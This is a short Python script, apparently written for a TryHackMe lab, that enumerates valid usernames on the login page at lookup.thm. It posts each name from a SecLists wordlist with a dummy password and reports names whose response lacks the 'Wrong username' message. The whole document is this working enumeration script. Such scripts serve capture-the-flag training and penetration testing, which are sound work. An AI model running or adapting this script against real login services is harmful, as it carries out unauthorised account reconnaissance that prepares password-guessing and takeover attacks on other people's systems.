
import requests

url = "http://lookup.thm/login.php"

with open("/usr/share/wordlists/seclist/usernames/names/names.txt") as file:
	for line in file:
		name = line.strip()
		data = {'username':name,
				'password':'any'}
		response = requests.post(url, data=data)
		if "Wrong username" not in response.text:
			print(f"{name} exists as user")